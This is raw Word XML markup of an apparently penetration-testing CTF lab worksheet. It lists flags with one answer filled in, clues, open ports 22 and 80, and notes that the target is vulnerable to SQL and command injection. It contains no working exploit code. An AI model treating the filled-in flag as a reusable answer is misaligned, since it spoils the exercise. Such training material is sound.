          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="18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Open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nd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ex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mine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ny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io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l fil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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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g.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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Wh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 your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ing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?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9120"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ngs: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F7A40">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">docs and xls files hidden </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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10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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="17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 xml:space="preserve">Capture the </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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2"/>
          <w:position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position w:val="-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2"/>
          <w:position w:val="-1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1"/>
          <w:position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re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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ord</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:position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3"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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-3"/>
          <w:position w:val="-1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pacing w:val="-1"/>
          <w:position w:val="-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1"/>
          <w:position w:val="-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en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>fla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g:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00397242" w:rsidRPr="00397242">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00397242" w:rsidRPr="00397242">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xrayed_the_fraud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-53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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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11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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="17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R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 xml:space="preserve">ad </w:t>
      </w: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t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 xml:space="preserve">he Clue to </w:t>
      </w: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t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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>N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>x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 xml:space="preserve">t </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="-1"/>
          <w:position w:val="-1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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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2"/>
          <w:position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position w:val="-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2"/>
          <w:position w:val="-1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1"/>
          <w:position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position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2"/>
          <w:position w:val="-1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 xml:space="preserve">ord </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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-3"/>
          <w:position w:val="-1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pacing w:val="-1"/>
          <w:position w:val="-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1"/>
          <w:position w:val="-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en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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clue:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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pict>
          <v:group id="_x0000_s1101" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:339pt;height:13.5pt;z-index:-1890;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6780,270">
            <v:shape id="_x0000_s1103" style="position:absolute;left:2520;top:37;width:6760;height:250" coordorigin="2520,37" coordsize="6760,250" path="m2520,287r6760,l9280,37r-6760,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1102" style="position:absolute;left:3120;top:261;width:6161;height:0" coordorigin="3120,261" coordsize="6161,0" path="m3120,261r6161,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>LUE:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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12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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="17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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1762" w:right="4984"/>
        <w:jc w:val="center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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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If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you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v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n’t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one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so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y,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ck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.sync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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Last sync: Mannie Agent v7.14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId27"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1340" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Status: SUCCESS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1028" type="#_x0000_t75" style="width:7in;height:113.25pt">
            <v:imagedata r:id="rId28" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1685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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">What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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>W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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>e Know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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>So F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="381" w:lineRule="auto"/>
        <w:ind w:left="1685" w:right="9512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K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li IP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=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Ta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get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IP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=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="00BE01E5" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>CP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>22, 80</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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We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si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e </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ulne</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>le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o:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2045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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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QL inject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, c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pacing w:val="-3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njection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
